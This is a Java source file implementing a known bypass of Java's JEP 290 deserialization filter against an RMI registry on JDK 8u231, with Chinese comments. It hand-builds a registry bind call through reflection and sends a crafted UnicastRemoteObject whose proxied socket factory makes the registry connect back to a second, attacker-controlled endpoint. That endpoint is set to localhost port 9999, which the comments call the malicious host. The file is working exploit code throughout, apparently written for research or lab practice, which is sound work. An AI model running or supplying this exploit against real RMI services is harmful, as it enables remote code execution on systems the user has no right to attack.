package com.lingx5.RMI;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.io.ObjectOutput;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.*;
import java.util.Random;

public class bypassJEP8u231 {
    public static void main(String[] args) throws Exception {
        // 拿到registryStub对象
        Registry registry_Stub = LocateRegistry.getRegistry("127.0.0.1", 1099);
        /*
        重写 bind方法
         */
        // 反射获取registryStub对象的operations字段
        Field f = registry_Stub.getClass().getDeclaredFields()[0];
        f.setAccessible(true);
        Operation[] operations = (Operation[]) f.get(registry_Stub);
        // 获取registryStub对象的ref字段
        Field ref_filed = RemoteObject.class.getDeclaredField("ref");
        ref_filed.setAccessible(true);
        UnicastRef ref = (UnicastRef) ref_filed.get(registry_Stub);
        RemoteCall remoteCall = ref.newCall((RemoteObject) registry_Stub, operations, 2, 4905912898345647071L);
        ObjectOutput outputStream = remoteCall.getOutputStream();
        Field enableReplace_filed = ObjectOutputStream.class.getDeclaredField("enableReplace");
        enableReplace_filed.setAccessible(true);
        enableReplace_filed.setBoolean(outputStream, false);
        outputStream.writeObject("lingx5");
        outputStream.writeObject(getPayload());  // 发送payload
        ref.invoke(remoteCall);
        ref.done(remoteCall);

    }
    static UnicastRemoteObject getPayload(){
        UnicastRemoteObject unicastRemoteObject =null;
        try {
            // 创建一个TCPEndpoint对象，指定恶意主机的IP地址和端口号
            TCPEndpoint endpoint = new TCPEndpoint("127.0.0.1", 9999);
            LiveRef liveRef = new LiveRef(new ObjID(new Random().nextInt()), endpoint, false);
            UnicastRef unicastRef = new UnicastRef(liveRef);
            // 允许保存动态代理生成的类文件
            System.getProperties().put("sun.misc.ProxyGenerator.saveGeneratedFiles", "true");

            // 动态代理：创建一个实现RMIServerSocketFactory和Remote接口的代理对象
            RemoteObjectInvocationHandler handler = new RemoteObjectInvocationHandler(unicastRef);
            RMIServerSocketFactory factory = (RMIServerSocketFactory) Proxy.newProxyInstance(handler.getClass().getClassLoader(),
                    new Class[]{RMIServerSocketFactory.class,Remote.class},handler);
            Constructor<UnicastRemoteObject> constructor = UnicastRemoteObject.class.getDeclaredConstructor();
            constructor.setAccessible(true);
            unicastRemoteObject = constructor.newInstance();
            // 反射修改ssf的值
            Field declaredField = unicastRemoteObject.getClass().getDeclaredField("ssf");
            declaredField.setAccessible(true);
            declaredField.set(unicastRemoteObject,factory);

        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
        return unicastRemoteObject;
    }
}
